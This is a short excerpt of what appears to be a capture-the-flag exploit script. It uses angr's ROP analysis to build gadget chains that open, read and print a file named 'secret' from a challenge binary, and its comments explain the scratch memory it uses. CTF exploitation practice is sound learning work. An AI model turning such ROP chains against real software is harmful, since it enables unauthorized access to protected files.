# ...

    r = p.analyses.ROP()
    r.find_gadgets()

    '''
    We make three gadget chains: one to do an open,
    one to do a read, and one to do a write.
    We use the range [0xa00100, 0xa00f00] as scratch space for angrop.
    This is mapped writeable
    for us by the challenge binary. Also, kindly,
    the challenge binary pre-populates this menory
    region with "secret", which is the file that we need to cat out.
    '''
    chains = [
        r.do_syscall(2, (0xa00000, 0, 0), modifiable_memory_range=[0xa00100, 0xa00f00]), # This opens "secret", into file descriptor 3
        r.do_syscall(0, (3, 0xa00000, 1024), modifiable_memory_range=[0xa00100, 0xa00f00]), # This reads from file descriptor 3
        r.do_syscall(1, (1, 0xa00000), modifiable_memory_range=[0xa00100, 0xa00f00]) # This writes the read data to stdout
    ]

# ...